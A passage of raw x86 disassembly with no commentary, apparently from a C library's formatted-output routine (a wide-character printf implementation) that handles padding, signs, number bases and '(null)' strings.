jle 0x806dc53
mov eax, dword [var_1084h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
mov edx, dword [var_1068h]
add dword [var_1030h], ebx
test edx, edx
je 0x806dcaf
mov eax, dword [var_1084h]
test eax, eax
jle 0x806dcaf
mov eax, dword [var_1084h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
add dword [var_1030h], eax
test edi, edi
je 0x806d9ed
mov dword [esp], esi
call fcn.08051180
jmp 0x806d9ed
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
add dword [var_1030h], ebx
jmp 0x806d9ed
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806dbc5
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x806c5e3
mov edi, 1
jmp 0x806dbd1
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
jmp 0x806dbb2
cmp dword [var_1088h], 0xffffffff
je 0x806dd4b
mov edx, dword [var_1088h]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.080783a0
mov ebx, eax
jmp 0x806dc10
mov dword [esp], esi
call fcn.08077690
jmp 0x806dd44
cmp dword [var_1088h], 0xffffffff
je 0x806dd67
cmp dword [var_1088h], 5
jle 0x806dd76
mov esi, str._null_
mov ebx, 6
jmp 0x806dc10
mov esi, 0x8092948
xor ebx, ebx
jmp 0x806dc10
mov eax, dword [var_1074h]
test eax, eax
jne 0x806dde4
mov edi, dword [var_1080h]
test edi, edi
jne 0x806ddcd
mov esi, dword [var_1078h]
test esi, esi
je 0x806ddb7
mov eax, dword [arg_10h]
mov edi, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], di
jmp 0x806d9ed
mov eax, dword [arg_10h]
mov ecx, dword [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x806d9ed
mov eax, dword [arg_10h]
movzx edx, byte [var_1030h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov byte [eax], dl
jmp 0x806d9ed
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_1030h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x806d9ed
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x806e4a1
mov dword [var_105ch], 0x10
mov dword [var_1058h], eax
mov dword [var_1050h], 0
mov dword [var_1060h], 1
mov dword [var_1070h], 0
mov dword [var_1094h], 0x78
cmp dword [var_1088h], 0
jl 0x806e492
mov dword [var_1090h], 0x20
jne 0x806e36c
mov eax, dword [var_1058h]
test eax, eax
jne 0x806e36c
cmp dword [var_105ch], 8
mov esi, dword [var_103ch]
je 0x806e349
mov eax, dword [var_103ch]
sub eax, esi
sar eax, 2
cmp dword [var_1088h], eax
jg 0x806dec0
mov edi, dword [var_1058h]
test edi, edi
je 0x806dec0
mov ebx, dword [var_1060h]
test ebx, ebx
je 0x806dec0
cmp dword [var_105ch], 8
je 0x806e33b
lea esi, [esi]
mov edx, dword [var_103ch]
mov eax, 0
mov ecx, dword [var_1068h]
sub edx, esi
sar edx, 2
sub dword [var_1088h], edx
cmovns eax, dword [var_1088h]
test ecx, ecx
mov dword [var_1088h], eax
jne 0x806e151
lea eax, [eax + edx]
sub dword [var_1084h], eax
mov eax, dword [var_1058h]
test eax, eax
je 0x806df2b
mov edi, dword [var_1060h]
test edi, edi
je 0x806df2b
mov eax, dword [var_1084h]
sub eax, 2
cmp dword [var_105ch], 0x10
cmovne eax, dword [var_1084h]
mov dword [var_1084h], eax
mov ebx, dword [var_1050h]
test ebx, ebx
jne 0x806df49
mov ecx, dword [var_106ch]
test ecx, ecx
jne 0x806df49
mov edx, dword [var_1064h]
test edx, edx
je 0x806df4f
dec dword [var_1084h]
cmp dword [var_1090h], 0x20
je 0x806e115
mov eax, dword [var_1050h]
test eax, eax
je 0x806e0ae
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e092
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
mov eax, dword [var_1058h]
test eax, eax
je 0x806dfab
mov eax, dword [var_1060h]
test eax, eax
je 0x806dfab
cmp dword [ebp - 0x105c], 0x10
je 0x806e013
mov edi, dword [var_1088h]
add dword [var_1084h], edi
mov edi, dword [var_1084h]
test edi, edi
jle 0x806dfe4
mov eax, dword [ebp - 0x1084]
mov edx, dword [ebp + 8]
mov dword [esp + 4], 0x30
mov dword [esp + 8], eax
mov dword [esp], edx
call fcn.08075900
add dword [ebp - 0x1030], eax
mov ecx, dword [ebp + 8]
mov ebx, dword [ebp - 0x103c]
mov eax, dword [ecx + 0x94]
sub ebx, esi
mov dword [esp], ecx
sar ebx, 2
mov dword [esp + 4], esi
mov dword [esp + 8], ebx
call dword [eax + 0x1c]
cmp eax, ebx
je 0x806d9e7
jmp 0x806c5e3
mov ecx, dword [ebp + 8]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e073
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [ebp - 0x1030]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e05b
mov ecx, dword [ebp - 0x1094]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [ebp - 0x1030]
jmp 0x806dfab
mov eax, dword [ebp - 0x1094]
mov edx, dword [ebp + 8]
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806e04a
mov dword [esp + 4], 0x30
mov dword [esp], ecx
call fcn.08075d10
inc eax
je 0x806c5e3
mov edi, dword [ebp + 8]
mov edx, dword [edi + 0x58]
jmp 0x806e02d
mov dword [esp + 4], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x806df88
jmp 0x806c5e3
mov eax, dword [ebp - 0x106c]
test eax, eax
je 0x806e0de
mov edi, dword [ebp + 8]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e0d1
mov dword [eax], 0x2b
jmp 0x806df82
mov dword [esp + 4], 0x2b
mov dword [esp], edi
jmp 0x806e09d
mov eax, dword [ebp - 0x1064]
test eax, eax
je 0x806df8e
mov eax, dword [ebp + 8]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e105
mov dword [eax], 0x20
jmp 0x806df82
mov edx, dword [ebp + 8]
mov dword [esp + 4], 0x20
mov dword [esp], edx
jmp 0x806e09d
mov eax, dword [ebp - 0x1084]
test eax, eax
jle 0x806e142
mov edi, dword [ebp - 0x1084]
mov eax, dword [ebp + 8]
mov dword [esp + 4], 0x20
mov dword [esp + 8], edi
mov dword [esp], eax
call fcn.08075900
add dword [ebp - 0x1030], eax
mov dword [ebp - 0x1084], 0
jmp 0x806df5c
mov ebx, dword [ebp - 0x1050]
test ebx, ebx
je 0x806e2d4
mov edi, dword [ebp + 8]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e2b8
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [ebp - 0x1030]
dec dword [ebp - 0x1084]
mov eax, dword [ebp - 0x1058]
test eax, eax
je 0x806e1aa
mov eax, dword [ebp - 0x1060]
test eax, eax
je 0x806e1aa
cmp dword [ebp - 0x105c], 0x10
je 0x806e235
mov ebx, dword [ebp - 0x103c]
mov edi, dword [ebp - 0x1088]
sub ebx, esi
sar ebx, 2
lea eax, [edi + ebx]
sub dword [ebp - 0x1084], eax
test edi, edi
jle 0x806e1e5
mov eax, dword [ebp + 8]
mov dword [esp + 8], edi
mov dword [esp + 4], 0x30
mov dword [esp], eax
call fcn.08075900
add dword [ebp - 0x1030], eax
mov edx, dword [ebp + 8]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [esp + 4], esi
mov dword [esp + 8], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x806c5e3
add dword [ebp - 0x1030], eax
mov eax, dword [ebp - 0x1084]
test eax, eax
jle 0x806d9ed
mov ecx, dword [ebp - 0x1084]
mov esi, dword [ebp + 8]
mov dword [esp + 4], 0x20
mov dword [esp + 8], ecx
mov dword [esp], esi
jmp 0x806db33
mov edi, dword [ebp + 8]
mov edx, dword [edi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e29c
mov dword [eax], 0x30
add eax, 4
mov dword [edx + 0x10], eax
inc dword [ebp - 0x1030]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e284
mov ecx, dword [ebp - 0x1094]
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806c5e3
inc dword [ebp - 0x1030]
sub dword [ebp - 0x1084], 2
jmp 0x806e1aa
mov eax, dword [ebp - 0x1094]
mov edx, dword [ebp + 8]
mov dword [esp + 4], eax
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x806e26c
mov dword [esp + 4], 0x30
mov dword [esp], edi
call fcn.08075d10
inc eax
je 0x806c5e3
mov edx, dword [edi + 0x58]
jmp 0x806e24f
mov dword [esp + 4], 0x2d
mov dword [esp], edi
call fcn.08075d10
inc eax
jne 0x806e17d
jmp 0x806c5e3
mov ecx, dword [ebp - 0x106c]
test ecx, ecx
je 0x806e307
mov eax, dword [ebp + 8]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e2f7
mov dword [eax], 0x2b
jmp 0x806e177
mov edx, dword [ebp + 8]
mov dword [esp + 4], 0x2b
mov dword [esp], edx
jmp 0x806e2c3
mov edx, dword [ebp - 0x1064]
test edx, edx
je 0x806e189
mov ecx, dword [ebp + 8]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e32e
mov dword [eax], 0x20
jmp 0x806e177
mov dword [esp + 4], 0x20
mov dword [esp], ecx
jmp 0x806e2c3
sub esi, 4
mov dword [esi], 0x30
jmp 0x806dec0
mov eax, dword [ebp - 0x1060]
test eax, eax
je 0x806de85
mov ecx, dword [ebp - 0x103c]
sub esi, 4
mov dword [ecx - 4], 0x30
jmp 0x806de85
cmp dword [ebp - 0x1094], 0x58
mov esi, str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
mov ecx, dword [ebp - 0x1058]
sete al
mov ebx, dword [ebp - 0x103c]
test al, 1
mov eax, str.0123456789abcdefghijklmnopqrstuvwxyz
cmove esi, eax
cmp dword [ebp - 0x105c], 0xa
je 0x806e46c
ja 0x806e448
cmp dword [ebp - 0x105c], 8
je 0x806e434
mov eax, ecx
xor edx, edx
sub ebx, 4
div dword [ebp - 0x105c]
mov ecx, eax
mov eax, dword [esi + edx*4]
test ecx, ecx
mov dword [ebx], eax
jne 0x806e3b1
mov eax, dword [ebp - 0x1070]
mov esi, ebx
test eax, eax
je 0x806e400
mov eax, dword [ebp - 0x102c]
test eax, eax
je 0x806e400
mov edx, dword [ebp - 0x1028]
mov ecx, dword [ebp - 0x102c]
mov eax, ebx
mov dword [esp], edx
mov edx, dword [ebp - 0x103c]
call fcn.0806f240
sub esp, 4
mov esi, eax
mov eax, dword [ebp - 0x108c]
test eax, eax
je 0x806de85
cmp dword [ebp - 0x105c], 0xa
jne 0x806de85
mov ecx, dword [ebp - 0x103c]
mov dword [esp], esi
mov dword [esp + 4], ecx
call fcn.0806b880
mov esi, eax
jmp 0x806de85
mov eax, ecx
sub ebx, 4
and eax, 7
shr ecx, 3
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806e434
jmp 0x806e3c9
cmp dword [ebp - 0x105c], 0x10
jne 0x806e3b1
mov eax, ecx
sub ebx, 4
and eax, 0xf
shr ecx, 4
mov eax, dword [esi + eax*4]
mov dword [ebx], eax
jne 0x806e455
jmp 0x806e3c9
mov edi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul edi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [esi + ecx*4]
mov ecx, edx
mov dword [ebx], eax
jne 0x806e471
jmp 0x806e3c9
mov dword [ebp - 0x1088], 1
jmp 0x806e36c
cmp dword [ebp - 0x1088], 4
mov eax, 5
mov esi, str._nil_
cmovg eax, dword [ebp - 0x1088]
mov dword [ebp - 0x1088], eax
jmp 0x806db6e
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x806db78
mov ebx, dword [var_107ch]
test ebx, ebx
jne case.0x806e931.25
mov ecx, dword [var_1068h]
dec dword [var_1084h]
test ecx, ecx
jne 0x806e51d
mov edx, dword [var_1084h]
test edx, edx
jle 0x806e51d
mov edx, dword [var_1084h]
mov ecx, dword [arg_8h]
mov dword [arg_4h], 0x20
mov dword [arg_8h], edx
mov dword [esp], ecx
call fcn.08075900
add dword [var_1030h], eax
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [esp], eax
call fcn.08077740
mov ecx, eax
jmp 0x806dadc
lea ebx, [var_fech]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_1094h]
rep stosd dword es:[edi], eax
mov eax, dword [var_1084h]
movzx ecx, byte [var_107ch]
mov dword [var_fe4h], edx
mov edi, dword [var_1088h]
movzx edx, byte [var_1078h]
mov dword [var_fe8h], eax
shl ecx, 2
mov dword [var_fech], edi
add edx, edx
movzx eax, byte [var_fe0h]
and eax, 0xfffffffc
or eax, dword [var_1074h]
or eax, edx
movzx edx, byte [var_1060h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_1064h]
shl edx, 3
or eax, edx
movzx edx, byte [var_1068h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_106ch]
shl edx, 5
or eax, edx
movzx edx, byte [var_1070h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
mov ecx, dword [var_1090h]
shl edx, 7
or eax, edx
mov dword [var_fdch], ecx
movzx edx, byte [var_108ch]
mov byte [var_fe0h], al
movzx eax, byte [var_fdfh]
shl edx, 3
or eax, 4
and eax, 0xfffffff7
or eax, edx
mov byte [var_fdfh], al
mov eax, dword [var_1074h]
test eax, eax
je 0x806e65e
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_fc8h], edx
mov dword [var_fc4h], ecx
mov dword [var_fcch], eax
mov esi, dword [arg_8h]
lea eax, [var_fcch]
mov dword [arg_4h], ebx
mov dword [var_ffch], eax
lea eax, [var_ffch]
mov dword [arg_8h], eax
mov dword [esp], esi
call fcn.08067f60
jmp 0x806d9df
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0xfcc]
jmp 0x806e634
mov dword [var_105ch], 0x10
mov eax, dword [var_1074h]
mov dword [var_1050h], 0
mov dword [var_106ch], 0
mov dword [var_1064h], 0
test eax, eax
je 0x806e7e0
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov esi, dword [eax]
mov edi, dword [eax + 4]
mov dword [var_1058h], esi
mov dword [var_1054h], edi
cmp dword [var_1088h], 0
jl 0x806e7d1
mov dword [var_1090h], 0x20
jne 0x806e72c
mov edi, dword [var_1054h]
or edi, dword [var_1058h]
jne 0x806e72c
cmp dword [var_105ch], 8
mov esi, dword [var_103ch]
je 0x806e710
mov edx, dword [var_1058h]
or edx, dword [var_1054h]
setne al
movzx eax, al
mov dword [var_1058h], eax
jmp 0x806de85
mov eax, dword [var_1060h]
test eax, eax
je 0x806e6f3
mov eax, dword [var_103ch]
sub esi, 4
mov dword [eax - 4], 0x30
jmp 0x806e6f3
xor eax, eax
mov esi, dword [var_1058h]
mov edi, dword [var_1054h]
cmp dword [var_1094h], 0x58
mov edx, dword [var_105ch]
sete al
mov ecx, dword [var_103ch]
mov dword [esp], esi
mov dword [arg_4h], edi
mov dword [arg_ch], edx
mov dword [arg_8h], ecx
mov dword [arg_10h], eax
call fcn.0808d930
mov edi, dword [var_1070h]
mov esi, eax
test edi, edi
je 0x806e79d
mov ebx, dword [var_102ch]
test ebx, ebx
je 0x806e79d
mov edi, dword [var_1028h]
mov ecx, dword [var_102ch]
mov edx, dword [var_103ch]
mov dword [esp], edi
call fcn.0806f240
sub esp, 4
mov esi, eax
mov ecx, dword [var_108ch]
test ecx, ecx
je 0x806e6f3
cmp dword [var_105ch], 0xa
jne 0x806e6f3
mov eax, dword [var_103ch]
mov dword [esp], esi
mov dword [arg_4h], eax
call fcn.0806b880
mov esi, eax
jmp 0x806e6f3
mov dword [var_1088h], 1
jmp 0x806e72c
mov edx, dword [var_1080h]
test edx, edx
je 0x806e7ff
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_1058h], eax
jmp 0x806de47
mov eax, dword [var_1078h]
test eax, eax
jne 0x806e814
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x806e7f4
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x806e7f4
mov dword [var_105ch], 8
jmp 0x806e679
mov dword [var_105ch], 0xa
jmp 0x806e679
mov eax, dword [var_1074h]
mov dword [var_105ch], 0xa
test eax, eax
je 0x806e883
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov edi, edx
shr edi, 0x1f
mov dword [var_1050h], edi
je 0x806e872
neg eax
adc edx, 0
neg edx
mov dword [var_1058h], eax
mov dword [var_1054h], edx
jmp 0x806e6bd
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov edx, eax
mov ecx, eax
neg edx
shr ecx, 0x1f
cmovne eax, edx
mov dword [var_1050h], ecx
jmp 0x806e7f4
mov esi, dword [arg_8h]
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806e8c8
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_1030h]
jmp 0x806d9ed
mov dword [arg_4h], 0x25
mov dword [esp], esi
call fcn.08075d10
inc eax
jne 0x806e8bd
jmp 0x806c5e3
mov eax, dword [var_ff4h]
mov dword [var_1074h], 1
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1480]
jmp edx
mov dword [var_1078h], 0
mov dword [var_1080h], 1
mov eax, dword [var_ff4h]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806e92a
mov eax, dword [var_ff4h]
mov dword [var_1074h], 1
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
jmp 0x806e92a
mov dword [var_1074h], 0
mov dword [var_107ch], 0
jmp 0x806e947
mov eax, dword [var_ff4h]
mov dword [var_1074h], 0
mov dword [var_107ch], 0
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
jmp 0x806e92a
mov eax, dword [var_ff4h]
mov dword [var_107ch], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov ecx, dword [var_1094h]
mov eax, dword [ecx*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1400]
jmp edx
mov eax, dword [var_ff4h]
mov dword [var_1078h], 1
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [var_ff4h], edx
mov edx, case.0x806bc21.32
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edi, dword [var_1094h]
mov eax, dword [edi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1380]
jmp edx
mov ecx, dword [var_ff4h]
mov eax, dword [ecx + 4]
lea edx, [ecx + 4]
mov dword [var_ff4h], edx
cmp eax, 0x2a
je 0x806ec9f
sub eax, 0x30
mov dword [var_1088h], 0
cmp eax, 9
jbe 0x806ec86
mov ecx, dword [var_1084h]
cmp dword [var_1088h], ecx
jle 0x806eb4e
mov eax, dword [var_1088h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806eb4e
mov ebx, dword [var_1088h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec4e
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov edx, case.0x806bc21.32
mov eax, dword [eax]
mov dword [var_1094h], eax
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov esi, dword [var_1094h]
mov eax, dword [esi*4 + 0x80a1000]
mov edx, dword [eax*4 + 0x80a1300]
jmp edx
mov dword [var_108ch], 1
jmp 0x806bcfb
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1084h], eax
add eax, 0x20
cmp eax, 0x3e7
jle 0x806ebe3
mov ebx, dword [var_1084h]
shl ebx, 2
lea esi, [ebx + 0x80]
cmp esi, 0x1000
ja 0x806ec1d
lea eax, [ebx + 0x90]
sub esp, eax
lea eax, [arg_23h]
and eax, 0xfffffff0
lea eax, [ebx + eax + 0x80]
mov dword [var_103ch], eax
mov eax, dword [var_ff4h]
mov eax, dword [eax]
cmp eax, 0x24
je 0x806c1ed
mov dword [var_1094h], eax
mov edx, case.0x806bc21.32
sub eax, 0x20
cmp eax, 0x5a
ja case.default.0x806c1dd
mov edx, dword [var_1094h]
mov eax, dword [edx*4 + 0x80a1000]
jmp 0x806be80
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806ebc7
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [var_1038h], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [var_103ch], ebx
jmp 0x806ebe3
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806eb32
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [var_1038h], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [var_103ch], ebx
jmp 0x806eb4e
lea eax, [var_ff4h]
mov dword [esp], eax
call fcn.0806b980
mov dword [var_1088h], eax
jmp 0x806eaf9
mov eax, dword [ecx + 8]
lea edx, [ecx + 8]
mov dword [var_ff4h], edx
mov dword [var_ff8h], edx
sub eax, 0x30
cmp eax, 9
jbe 0x806ecdf
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_1088h], eax
jns 0x806eaf9
mov dword [var_1088h], 0xffffffff
jmp 0x806eaf9
lea eax, [var_ff8h]
mov dword [esp], eax
call fcn.0806b980
test eax, eax
je 0x806ecb9
mov eax, dword [var_ff8h]
cmp dword [eax], 0x24
jne 0x806ecb9
jmp 0x806c1ed
mov dword [esp], eax
call fcn.0807adb0
test eax, eax
jne 0x806c171
mov eax, dword [ebp - 0x10f4]
cmp dword [ebp - 0x10f0], eax
cmovge eax, dword [ebp - 0x10f0]
lea eax, [eax*4 + 0x80]
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [ebp - 0x10f4]
cmp dword [ebp - 0x10f0], edx
mov dword [ebp - 0x1104], eax
mov ecx, dword [ebp - 0x1104]
mov eax, edx
cmovge eax, dword [ebp - 0x10f0]
lea eax, [ecx + eax*4 + 0x80]
jmp 0x806c1ac
mov dword [esi + edx], 0xffffffff
jmp 0x806c122
neg eax
or ebx, 0x20
mov byte [esi + ecx + 0xc], bl
mov dword [esi + ecx + 4], eax
mov dword [ebp - 0x10d4], 1
jmp 0x806c0e0
mov esi, dword [ebp - 0x1104]
mov dword [esp], esi
call fcn.08051180
jmp 0x806bf49
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806be38
mov dword [esp], esi
call fcn.08050fe0
test eax, eax
mov dword [ebp - 0x1038], eax
je 0x806c5e3
lea ebx, [ebx + eax + 0x80]
mov dword [ebp - 0x103c], ebx
jmp 0x806be54
neg eax
mov dword [ebp - 0x1090], 0x20
mov dword [ebp - 0x1068], 1
mov dword [ebp - 0x1084], eax
jmp 0x806be0d
lea eax, [ebp - 0xff0]
mov dword [esp], eax
call fcn.0806b980
test eax, eax
je 0x806bdf6
mov eax, dword [ebp - 0xff0]
cmp dword [eax], 0x24
jne 0x806bdf6
jmp 0x806c1ed
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.08074540
jmp 0x806bad1
mov edx, 0xffffffff
mov dword [ebx], 0x16
jmp 0x806ba45
mov dword [ebx], 9
jmp 0x806ba45
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov eax, dword [arg_ch]
mov dword [var_10h], esp
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
cmp ecx, edx
mov eax, edx
cmovge eax, ecx
lea eax, [eax*4 + 0x90]
sub esp, eax
lea eax, [var_17h]
and eax, 0xfffffff0
cmp ecx, edx
cmovge edx, ecx
lea edx, [eax + edx*4 + 0x80]
mov eax, dword [var_8h]
mov dword [var_14h], edx
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f210
mov dword [eax], 0x25
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
mov edi, 1
movzx eax, byte [edx + 0xc]
test al, 8
je 0x806eee3
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1ec
mov dword [eax], 0x23
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
mov edi, 2
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x806ef0d
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f1cd
mov dword [eax], 0x27
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x806f1a2
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f183
mov dword [eax], 0x2b
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [var_10h]
inc edi
movzx eax, byte [edx + 0xc]
test al, 0x20
je 0x806ef5e
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f164
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc edi
mov eax, dword [var_10h]
cmp dword [eax + 0x10], 0x30
je 0x806f129
mov eax, dword [var_10h]
test byte [eax + 0xd], 8
je 0x806ef93
mov eax, dword [var_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f10d
mov dword [eax], 0x49
add eax, 4
mov dword [edx + 0x10], eax
inc edi
mov edx, dword [var_10h]
mov eax, dword [edx + 4]
test eax, eax
je 0x806f000
mov ecx, eax
mov ebx, dword [var_14h]
mov esi, 0xcccccccd
mov eax, ecx
sub ebx, 4
mul esi
shr edx, 3
lea eax, [edx + edx*4]
add eax, eax
sub ecx, eax
test edx, edx
mov eax, dword [ecx*4 + str.0123456789abcdefghijklmnopqrstuvwxyz]
mov ecx, edx
mov dword [ebx], eax
jne 0x806efa7
cmp ebx, dword [var_14h]
jae 0x806f000
lea esi, [esi]
mov eax, dword [var_8h]
mov ecx, dword [ebx]
add ebx, 4
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806f0f8
